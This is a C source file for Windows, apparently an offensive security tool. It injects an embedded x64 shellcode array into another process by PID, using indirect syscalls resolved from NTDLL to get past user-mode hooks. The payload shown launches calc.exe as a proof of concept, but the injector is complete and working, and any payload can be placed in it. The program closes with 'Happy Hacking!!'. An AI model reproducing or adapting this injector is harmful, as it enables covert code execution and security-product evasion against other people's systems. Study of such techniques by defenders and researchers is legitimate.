#include"syscall.h"
#pragma section(".text")

VOID inDirectInjection(
	_In_ HMODULE hNTDLL,
	_In_ LPCSTR NtFunctionName,
	_Out_ PDWORD NtFunctionSSN,
	_Out_ PUINT_PTR NtSysCallAddress
) {
	UCHAR SysCallOpcodes[2] = { 0x0F, 0x05 };
	DWORD NtSyscallNumber = 0;
	UINT_PTR FunctionAddress = 0;
	FunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunctionName);
	if (FunctionAddress == 0) {
		printf("[-] Couldn't Get Address ,error: 0x%lx", GetLastError());
		return;
	}
	*NtFunctionSSN = ((PBYTE)(FunctionAddress + 0x4))[0];
	*NtSysCallAddress = FunctionAddress + 0x12;
	
	return;
}

__declspec(allocate(".text")) CONST UCHAR shell[] = {
	0xfc,0x48,0x83,0xe4,0xf0,
	0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,
	0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,
	0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,
	0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
	0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,
	0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
	0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,
	0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,
	0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,
	0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,
	0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,
	0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,
	0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,
	0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,
	0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,
	0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,
	0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,
	0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,
	0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
	0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
	0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,
	0x64,0x2e,0x65,0x78,0x65,0x20,0x2f,0x63,0x20,0x63,0x61,0x6c,
	0x63,0x2e,0x65,0x78,0x65,0x00
};

int main(int argc, char* argv[]) {

	HANDLE hProcess, hThread = NULL;
	DWORD PID = NULL;
	DWORD oldProtection = 0;
	SIZE_T BytesWritten = 0;
	PVOID rbuffer = NULL;
	NTSTATUS STATUS = NULL;
	HMODULE hNTDLL = NULL;



	SIZE_T shell_size = sizeof(shell);
	if (argc < 2) {
		printf("[-] Usage: .program.exe 1234 \n");
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	ObjectAttributes OA = { sizeof(OA),NULL };
	ClientID CID = { (HANDLE)PID,NULL };

	hNTDLL = GetModuleHandleW(L"NTDLL");
	if (hNTDLL == NULL) {
		printf("[-] couldn't get a handle to NTDLL Module, error: %lx", GetLastError());
		return FALSE;
	}

	inDirectInjection(hNTDLL, "NtOpenProcess", &NTOPENPROCESS_SSN,&NT_SYSCALL);
	inDirectInjection(hNTDLL, "NtAllocateVirtualMemory", &NTALLOC_SSN, &NT_SYSCALL);
	inDirectInjection(hNTDLL, "NtWriteVirtualMemory", &NTWRITE_SSN, &NT_SYSCALL);
	inDirectInjection(hNTDLL, "NtProtectVirtualMemory", &NTPROTECT_SSN, &NT_SYSCALL);
	inDirectInjection(hNTDLL, "NtCreateThreadEx", &NTCREATETHREAD_SSN, &NT_SYSCALL);
	inDirectInjection(hNTDLL, "NtWaitForSingleObject", &NTWAIT_SSN, &NT_SYSCALL);
	inDirectInjection(hNTDLL, "NtFreeVirtualMemory", &NTFREE_SSN, &NT_SYSCALL);
	inDirectInjection(hNTDLL, "NtClose", &NTCLOSE_SSN, &NT_SYSCALL);

	// Starting Injection
	STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS != STATUS_SUCCESS) {
		printf("[-] Couldn't get a handle to the process , error :0x%lx \n", STATUS);
		return EXIT_FAILURE;
	}
	printf("[+] got a handle to the process: %ld \n  ........... hProcess : %p\n", PID, hProcess);

	//Allocate Memory VirtualAllocEX 
	printf("[*] trying to Allocate memory\n");

	STATUS = NtAllocateVirtualMemory(hProcess, &rbuffer, 0, &shell_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS != STATUS_SUCCESS) {
		printf("[-] Couldn't Allocate , error: %lx", STATUS);
		goto CLEANUP;
	}

	printf("[+] Allocated Buffer to Memory at : 0x%p\n", rbuffer);
	// Write process to memory WriteProcessMemory
	printf("[*] trying to Write the process to memory\n");
	STATUS = NtWriteVirtualMemory(hProcess, rbuffer, shell, shell_size, &BytesWritten);
	if (STATUS != STATUS_SUCCESS) {
		printf("[-] Couldn't Write to the memory ,error : 0x%lx\n", STATUS);
		goto CLEANUP;
	}
	printf("[+] Wrote to the memory \n");

	STATUS = NtProtectVirtualMemory(hProcess, &rbuffer, &shell_size, PAGE_EXECUTE_READ, &oldProtection);
	if (STATUS != STATUS_SUCCESS) {
		printf("[-] Couldn't Change Protection , error: 0x%lx", GetLastError());
		goto CLEANUP;
	}
	printf("[0x%p]  changed allocated buffer protection to PAGE_EXECUTE_READ ", rbuffer);

	printf("[*] Trying to get a handle to Thread\n");

	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rbuffer, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS != STATUS_SUCCESS)
	{
		printf("[-] Couldn't get a handle to a thread , error: 0x%lx", STATUS);
		goto CLEANUP;
	}
	printf("[+] Thread Created! ,Routine Started.\n [*] Waiting for finish execution\n ");
	STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
	printf("[+] Thread Finished!\n .. Happy Hacking!! ");

CLEANUP:
	if (rbuffer)
	{
		STATUS = NtFreeVirtualMemory(hProcess, &rbuffer, &shell_size, MEM_DECOMMIT);
		if (STATUS != STATUS_SUCCESS)
		{
			printf("[-] Couldn't Free Memory, error: 0x%lx", STATUS);

		}

	}
	if (hThread) {
		NtClose(hThread);

	}
	if (hProcess) {
		NtClose(hProcess);

	}

	return EXIT_SUCCESS;
}


